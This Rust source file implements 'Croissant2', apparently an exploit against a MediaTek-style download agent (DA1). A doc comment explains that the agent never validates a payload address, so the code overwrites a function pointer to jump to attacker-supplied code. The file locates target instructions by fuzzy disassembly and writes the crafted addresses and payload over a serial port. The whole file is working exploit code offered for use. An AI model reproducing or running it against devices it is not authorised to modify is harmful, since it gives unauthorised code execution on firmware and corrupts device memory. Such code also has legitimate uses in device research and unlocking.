use da_parser::da::hl::Region;
use da_patcher::{
    Disassembler,
    slice::fuzzy::{fuzzy_search_thumb2, generic_reg_matcher},
};
use simpleport::{SimpleRead, SimpleWrite};

use crate::{
    Result,
    exploit::{Exploit, boot_da2, cmp, croissant_find_ptr, find},
};
use derive_ctor::ctor;

/// DA1 function pointer overwrite
///
/// ### How it works?
/// DA1 supports both USB and UART as communication backends via function pointers. DA1 never checks for the payload address, so we can overwrite function pointer to jump to the payload instead.
///
/// **This corrupts .bss**. Booting next stage which resets USB is preferred, though it seems we don't corrupt DA2 loader-related functions.
#[derive(ctor)]
pub struct Croissant2<'a> {
    da1: &'a Region<'a>,
    payload: &'a [u8],
    da1_base: u32,
}

impl Exploit for Croissant2<'_> {
    fn run(&self, port: &mut simpleport::Port) -> Result<()> {
        let code = self.da1.code();
        let (base, offset) = croissant_find_ptr(
            "ldr r?, [r?, #?];\
             movs r?, #0x5a;\
             blx r?",
            code,
            2,
        )?;

        let payload_size = self.payload.len() as u32 + 16 as u32 + 4 + 4; // payload length + metadata + ptr which we won't overwrite + payload entry addr
        let to = base + offset + 4 // First, bump pointer to the end, so we can overwrite it
            - payload_size;

        let disasm = Disassembler::try_new()?;
        let backup_ptr = *fuzzy_search_thumb2(
            &disasm,
            code,
            "push.w ??;\
             movs r?, #0;\
             mov r?, r?;\
             mov r?, r?;\
             movs r?, #?;\
             mov r?, r?;\
             mov r?, r?;\
             bl #?;\
             ldr ??;\
             b #?",
            generic_reg_matcher,
        )?
        .start() as u32
            + self.da1_base;

        println!("Croissant: payload address: 0x{to:x}, backup ptr: 0x{backup_ptr:x}",);

        port.write_u32_be(to)?;
        port.write_u32_be(payload_size)?;
        // The remainder is exactly where we overwrite
        port.write_u32_be(payload_size - 4)?;
        port.read_u8()?; // Always ok

        // Jump address, the function to boot da2
        let boot_function = boot_da2(&disasm, code)? + self.da1_base;
        port.write_u32_le(boot_function | 1)?;

        // Original function which we'll restore
        let original_function = find(
            &disasm,
            code,
            "push ??; movs r?, #?; movs r?, #?; mov r?, r?; mov r?, r?; bl #?",
        )? + self.da1_base;
        port.write_u32_le(original_function | 1)?;

        // The pointer to restore (which we've overwritten)
        port.write_u32_le(base + offset)?;

        // `cmp` instruction address
        let patch_address = cmp(&disasm, code)? + self.da1_base;
        port.write_u32_le(patch_address)?;

        port.write_all(&self.payload)?;
        port.write_u32_le(backup_ptr | 1)?;

        port.read_u8()?; // Always ok

        // Payload entrypoint: upload addr + payload size - actual binary size
        // So basically start of the `self.payload`
        port.write_u32_le(to + payload_size - self.payload.len() as u32)?;

        Ok(())
    }
}
